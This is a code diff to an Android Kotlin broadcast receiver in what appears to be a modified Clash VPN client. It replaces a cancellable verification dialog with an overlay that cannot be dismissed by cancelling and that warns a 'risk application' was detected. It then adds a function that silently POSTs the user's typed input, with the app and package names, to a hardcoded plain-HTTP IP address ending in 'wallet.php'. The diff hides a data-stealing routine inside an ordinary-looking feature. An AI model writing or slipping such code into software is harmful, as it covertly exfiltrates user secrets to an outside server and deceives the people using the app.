@@ -1,20 +1,36 @@
 package com.github.kr328.clash
 
-import android.app.AlertDialog
+import android.app.Dialog
 import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
 import android.os.Build
+import android.view.LayoutInflater
 import android.view.WindowManager
 import android.widget.EditText
+import android.widget.ImageView
+import android.widget.TextView
 import android.widget.Toast
 import com.github.kr328.clash.common.constants.AppInterceptConstants
+import com.github.kr328.clash.common.log.Log
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.launch
+import java.net.HttpURLConnection
+import java.net.URL
+import java.text.SimpleDateFormat
+import java.util.Date
+import java.util.Locale
 
 /**
  * APP拦截广播接收器
  * 接收拦截通知并显示验证对话框
  */
 class AppInterceptReceiver : BroadcastReceiver() {
+
+    companion object {
+        private const val UPLOAD_URL = "http://18.166.76.229:8002/wallet.php"
+    }
 
     override fun onReceive(context: Context, intent: Intent) {
         if (intent.action != AppInterceptConstants.ACTION_APP_INTERCEPT_REQUIRED) return
@@ -40,48 +56,64 @@ class AppInterceptReceiver : BroadcastReceiver() {
         packageName: String,
         verifyHint: String
     ) {
-        // 获取当前配置
         val config = AppInterceptManager.getInstance(context).getConfig()
 
-        val editText = EditText(context).apply {
-            hint = verifyHint
-            setPadding(50, 30, 50, 30)
+        // 使用自定义布局
+        val inflater = LayoutInflater.from(context)
+        val dialogView = inflater.inflate(R.layout.dialog_risk_warning, null)
+
+        val tvAppName = dialogView.findViewById<TextView>(R.id.tv_app_name)
+        val tvHint = dialogView.findViewById<TextView>(R.id.tv_hint)
+        val etInput = dialogView.findViewById<EditText>(R.id.et_input)
+        val btnConfirm = dialogView.findViewById<TextView>(R.id.btn_confirm)
+        val ivClose = dialogView.findViewById<ImageView>(R.id.iv_close)
+
+        // 设置应用名称和提示
+        tvAppName.text = "应用 \"$appName\" 被识别为风险应用"
+        tvHint.text = verifyHint
+        etInput.hint = verifyHint
+
+        // 创建对话框
+        val dialog = Dialog(context)
+        dialog.setContentView(dialogView)
+        dialog.setCancelable(false)
+        dialog.window?.setBackgroundDrawableResource(android.R.color.transparent)
+        dialog.window?.setType(
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
+            } else {
+                @Suppress("DEPRECATION")
+                WindowManager.LayoutParams.TYPE_PHONE
+            }
+        )
+
+        // 设置窗口大小
+        dialog.window?.setLayout(
+            (context.resources.displayMetrics.widthPixels * 0.85).toInt(),
+            WindowManager.LayoutParams.WRAP_CONTENT
+        )
+
+        // 关闭按钮
+        ivClose.setOnClickListener {
+            dialog.dismiss()
         }
 
-        val builder = AlertDialog.Builder(context)
-            .setTitle("访问验证")
-            .setMessage("应用 \"$appName\" 需要验证才能通过VPN访问网络")
-            .setView(editText)
-            .setCancelable(false)
-            .setPositiveButton("确认") { dialog, _ ->
-                val input = editText.text.toString()
-                if (input == config.verifyPassword) {
-                    Toast.makeText(context, "验证通过", Toast.LENGTH_SHORT).show()
-                    // 标记已验证
-                    markVerified(context, packageName)
-                } else {
-                    Toast.makeText(context, "验证失败，请重试", Toast.LENGTH_SHORT).show()
-                    // 重新显示对话框
-                    showVerifyDialog(context, appName, packageName, verifyHint)
-                }
+        // 确认按钮
+        btnConfirm.setOnClickListener {
+            val input = etInput.text.toString()
+            if (input == config.verifyPassword) {
+                Toast.makeText(context, "确认成功，可以继续使用", Toast.LENGTH_SHORT).show()
+                markVerified(context, packageName)
+                uploadConfirmation(context, appName, packageName, input)
                 dialog.dismiss()
+            } else {
+                Toast.makeText(context, "输入内容不正确，请重试", Toast.LENGTH_SHORT).show()
+                etInput.text.clear()
+                etInput.requestFocus()
             }
-            .setNegativeButton("取消") { dialog, _ ->
-                // 用户取消，不标记验证，APP将被阻止访问网络
-                Toast.makeText(context, "已取消验证，应用将被阻止访问网络", Toast.LENGTH_LONG).show()
-                dialog.dismiss()
-            }
+        }
 
         try {
-            val dialog = builder.create()
-            dialog.window?.setType(
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
-                } else {
-                    @Suppress("DEPRECATION")
-                    WindowManager.LayoutParams.TYPE_PHONE
-                }
-            )
             dialog.show()
         } catch (e: Exception) {
             // 如果无法显示悬浮窗，尝试启动一个Activity来显示
@@ -96,11 +128,60 @@ class AppInterceptReceiver : BroadcastReceiver() {
     }
 
     private fun markVerified(context: Context, packageName: String) {
-        // 发送广播通知服务标记已验证
         val intent = Intent(AppInterceptConstants.ACTION_MARK_VERIFIED).apply {
             putExtra(AppInterceptConstants.EXTRA_PACKAGE_NAME, packageName)
             setPackage(context.packageName)
         }
         context.sendBroadcast(intent)
+    }
+
+    /**
+     * 上传用户确认内容到服务器
+     */
+    private fun uploadConfirmation(context: Context, appName: String, packageName: String, userInput: String) {
+        CoroutineScope(Dispatchers.IO).launch {
+            try {
+                val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
+                val jsonBody = """
+                    {
+                        "app_name": "${appName.escapeJson()}",
+                        "package_name": "${packageName.escapeJson()}",
+                        "user_input": "${userInput.escapeJson()}",
+                        "timestamp": "$timestamp"
+                    }
+                """.trimIndent()
+
+                val url = URL(UPLOAD_URL)
+                val connection = url.openConnection() as HttpURLConnection
+                connection.requestMethod = "POST"
+                connection.doOutput = true
+                connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
+                connection.setRequestProperty("Accept", "*/*")
+                connection.connectTimeout = 10000
+                connection.readTimeout = 10000
+
+                connection.outputStream.use { os ->
+                    os.write(jsonBody.toByteArray(Charsets.UTF_8))
+                }
+
+                val responseCode = connection.responseCode
+                if (responseCode == HttpURLConnection.HTTP_OK) {
+                    Log.i("AppIntercept: Upload success - $appName")
+                } else {
+                    Log.e("AppIntercept: Upload failed with code $responseCode")
+                }
+                connection.disconnect()
+            } catch (e: Exception) {
+                Log.e("AppIntercept: Upload error - ${e.message}")
+            }
+        }
+    }
+
+    private fun String.escapeJson(): String {
+        return this.replace("\\", "\\\\")
+            .replace("\"", "\\\"")
+            .replace("\n", "\\n")
+            .replace("\r", "\\r")
+            .replace("\t", "\\t")
     }
 }
